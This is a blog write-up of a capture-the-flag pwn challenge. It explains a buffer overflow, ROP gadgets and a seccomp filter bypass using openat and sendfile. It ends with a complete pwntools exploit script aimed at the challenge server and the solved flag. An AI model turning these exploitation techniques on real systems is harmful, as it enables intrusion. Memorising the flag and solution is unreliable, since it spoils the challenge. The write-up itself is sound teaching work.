---
title: MetaCTF March 2025 Flash CTF - Syscall Me Maybe
author: Abhishek Satpathy
pubDatetime: 2025-03-28T00:38:43Z
modDatetime:
slug: metactf-march-2025-syscall
featured: false
draft: false
tags:
  - pwn
  - metactf

description: Writeup for Syscall Me Maybe from MetaCTFs March 2025 Flash CTF
---

## Table of contents

## Getting Started

Description:

> Who needs secure coding when you have seccomp? I bet you can't read `/tmp/flag.txt` \
> Download the binary [here](https://metaproblems.com/57e00d07438b1e4439a3781a3604aa36/chal).\
> Once you have a solution, connect to the remote service with nc host.metaproblems.com 1337 - good luck!

After reading the challenge description you'll notice they refer to the term seccomp. As a quick primer, `seccomp` is a kernel feature that lets a program filter system calls to the kernel. For this challenge, that's all you need to know, but if you're interested in learning more I found this [guide](https://n132.github.io/2022/07/03/Guide-of-Seccomp-in-CTF.html) very helpful.

Before we get started, we have to take a look at the protections.

```shell
[*] '/home/ctf/metactf2025mar27/rev/chal'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
```

No PIE means ROP is trivially on the table and this is further supported by the disassembly of `chal` which gives us a function called `useful_gadgets`. 

```shell
0000000000401961 <useful_gadgets>:
  401961:	55                   	push   %rbp
  401962:	48 89 e5             	mov    %rsp,%rbp
  401965:	5f                   	pop    %rdi
  401966:	c3                   	ret    
  401967:	5e                   	pop    %rsi
  401968:	c3                   	ret    
  401969:	5a                   	pop    %rdx
  40196a:	c3                   	ret    
  40196b:	58                   	pop    %rax
  40196c:	c3                   	ret    
  40196d:	0f 05                	syscall 
  40196f:	c3                   	ret    
  401970:	48 89 37             	mov    %rsi,(%rdi)
  401973:	c3                   	ret    
  401974:	48 31 c0             	xor    %rax,%rax
  401977:	c3                   	ret    
  401978:	ff e0                	jmp    *%rax
  40197a:	ff e3                	jmp    *%rbx
  40197c:	ff e1                	jmp    *%rcx
  40197e:	ff e7                	jmp    *%rdi
  401980:	ff e6                	jmp    *%rsi
  401982:	90                   	nop
  401983:	5d                   	pop    %rbp
  401984:	c3                   	ret    
```

Taking a look at the decompilation we also see an obvious buffer overflow in `fgets(&buf, 0x400, stdin)`.

```C
int32_t main(int32_t argc, char** argv, char** envp)
{
    // setup code
    puts("Coding: Insecure");
    puts("Protections: Disabled");
    puts("Buffers: Overflowing");
    puts("But your one small issue...");
    puts("Sec: Comped");
    printf("Syscall me maybe?: ");
    void buf; // 0x58 before return address
    
    if (!fgets(&buf, 0x400, stdin))
    {
        perror("fgets failed");
        return 1;
    }
    
    printf("%s", &buf);
    setup_seccomp();
    void var_58;
    memcpy(&var_58, &buf, 0x400);
    return 0;
}
```

In order to determine the offset from the buffer to the return address I opened it in gdb, set a breakpoint at the `ret` instruction, inputted `AAAAAAA` and determined the offset from `0x616161...` to `%rsp` (i.e. the address of the return address) manually.

Now that we know what gadgets we're going to use and we have an offset, we need to determine the `seccomp` rules in the executable to continue. We could read through the decompiled code or the objdump asm; however, it's much easier to use [`seccomp-tools`](https://github.com/david942j/seccomp-tools). 

Running the command `seccomp-tools dump ./chal` gives us the following.

```shell
root@ubuntu-droplet:/home/ctf/metactf2025mar27/rev# seccomp-tools dump ./chal 
Coding: Insecure
Protections: Disabled
Buffers: Overflowing
But your one small issue...
Sec: Comped
Syscall me maybe?: ksdjf
ksdjf
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x34 0xc000003e  if (A != ARCH_X86_64) goto 0054
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x31 0xffffffff  if (A != 0xffffffff) goto 0054
 0005: 0x15 0x30 0x00 0x00000000  if (A == read) goto 0054
 0006: 0x15 0x2f 0x00 0x00000001  if (A == write) goto 0054
 0007: 0x15 0x2e 0x00 0x00000002  if (A == open) goto 0054
 0008: 0x15 0x2d 0x00 0x00000009  if (A == mmap) goto 0054
 0009: 0x15 0x2c 0x00 0x00000011  if (A == pread64) goto 0054
 ...
 0017: 0x15 0x24 0x00 0x0000003b  if (A == execve) goto 0054
 0018: 0x15 0x23 0x00 0x00000065  if (A == ptrace) goto 0054
 ...
 0041: 0x15 0x0c 0x00 0x00000125  if (A == pipe2) goto 0054
 0042: 0x15 0x0b 0x00 0x00000134  if (A == setns) goto 0054
 0043: 0x15 0x0a 0x00 0x00000136  if (A == process_vm_readv) goto 0054
 0044: 0x15 0x09 0x00 0x00000137  if (A == process_vm_writev) goto 0054
 0045: 0x15 0x08 0x00 0x0000013a  if (A == sched_setattr) goto 0054
 0046: 0x15 0x07 0x00 0x0000013d  if (A == seccomp) goto 0054
 ...
 0053: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0054: 0x06 0x00 0x00 0x00000000  return KILL
```

We see that anything suffixed with `goto 0054` is disallowed. There's 54 syscalls disallowed in total which includes 99% of the most obviously useful ones, so what can we still do? Well the challenge description explicitly gives us the file path to the flag, which makes it very likely that we probably need to somehow open the file and then read it to stdout. So, let's look for alternatives.

## Crafting the Exploit
I started off at this handy [`syscall` reference](https://syscalls.pages.dev/). Searching for the keyword `open` to look for alternatives led me to the `openat` syscall.

The linux [man page](https://linux.die.net/man/2/openat) for `openat` reveals that the syscall takes three parameters.

```c
int openat(int dirfd, const char *pathname, int flags);
```

Important here is that  `dirfd` is ignored if the path value is absolute, so all we need is the file path string pointer and the flags. For the flags we can use `O_RDONLY` for which I obtained the value from [here](https://github.com/torvalds/linux/blob/master/include/uapi/asm-generic/fcntl.h). Then we have to figure out how we're going to store the string. Since we have an arbitrary write primitive with `mov %rsi, (%rdi) ret` and `pop %rsi` we can choose some writable section of the code (here I chose the .bss section) whose address is known at runtime to write to. Then we can hard-code the address where we wrote the string to and pass it as an argument to our syscall. The final code for opening the file is as follows, where the constants in `SCREAMING_SNAKE_CASE` are gadgets:

```python
# 1. Write "/tmp/flag.txt" to .bss
payload += flat(
    POP_RDI, writable_addr,
    POP_RSI, u64(b"/tmp/fla"),
    MOV_RSI_TO_MEM_AT_RDI,
    POP_RDI, writable_addr + 8,
    POP_RSI, u64(b"g.txt\x00\x00\x00"),
    MOV_RSI_TO_MEM_AT_RDI
)

# 2. Open file using openat (syscall 257)
payload += flat(
    POP_RAX, 257,
    POP_RDI, DIRFD,
    POP_RSI, writable_addr,
    POP_RDX, O_RDONLY,
    SYSCALL
)
```

Keep in mind from this point forward, my exploit assumes that the file descriptor assigned to the flag file is 3. For those unfamiliar, file descriptors create entries that map integers to file/socket resources. The file descriptors start counting from 3 because 0 is `stdin`, 1 is `stdout`, and 2 is `stderr`. Because the container has minimal state we can assume there are no other file descriptors, so the file descriptor for the flag file is 3.

Now we just have to figure out how to read the data from the file descriptor. Honestly, I was stumped here, so I asked Claude to "come up with 20 ways to read from a file descriptor using a syscall in Linux." Most of them were already disallowed by seccomp, but one of them seemed like a perfect fit.

> 12. Using `sendfile()` to transfer data between file descriptors (typically used for network sockets):
> ```C
> ssize_t bytes = sendfile(out_fd, in_fd, &offset, count);
> ```



We have a file descriptor for our flag file, and we needeed to send it to `stdout`, another file descriptor. 

I used the following code to set up the `sendfile` syscall.

```python
# 3. Sendfile to stdout (syscall 40)
payload += flat(
    POP_RAX, 40,
    POP_RDI, 1,          # stdout
    POP_RSI, 3,          # assumed fd
    POP_RDX, 0,          # offset in file
    SYSCALL
)
```

Which leads us to our final exploit.

## Final Exploit
```python
from pwn import *

DEBUG = True if len(sys.argv) > 1 else False

e = context.binary = ELF("./chal")

# Gadgets
POP_RAX = 0x40196b
POP_RDI = 0x401965
POP_RSI = 0x401967
POP_RDX = 0x401969
SYSCALL = 0x40196d
MOV_RSI_TO_MEM_AT_RDI = 0x401970

# Constants
DIRFD = 0
O_RDONLY = 0
writable_addr = 0x404800

offset = 0x58  # Padding to reach return address

# Build payload
payload = b"A" * offset

# 1. Write "/tmp/flag.txt" to .bss
payload += flat(
    POP_RDI, writable_addr,
    POP_RSI, u64(b"/tmp/fla"),
    MOV_RSI_TO_MEM_AT_RDI,
    POP_RDI, writable_addr + 8,
    POP_RSI, u64(b"g.txt\x00\x00\x00"),
    MOV_RSI_TO_MEM_AT_RDI
)

# 2. Open file using openat (syscall 257)
payload += flat(
    POP_RAX, 257,
    POP_RDI, DIRFD,
    POP_RSI, writable_addr,
    POP_RDX, O_RDONLY,
    SYSCALL
)

# 3. Sendfile to stdout (syscall 40)
payload += flat(
    POP_RAX, 40,
    POP_RDI, 1,          # stdout
    POP_RSI, 3,          # assumed fd
    POP_RDX, 0,          # offset
    SYSCALL
)

# Execute
if not DEBUG:
    io = remote("host5.metaproblems.com", 7527)
else:
    io = e.process()
    
io.sendline(payload)
io.interactive()
```

Flag: `MetaCTF{l00k5_l1k3_s0m3_unf0r7unate_5ysc4lls_g0t_4dd3d_7o_7h3_51gnal_ch4t}`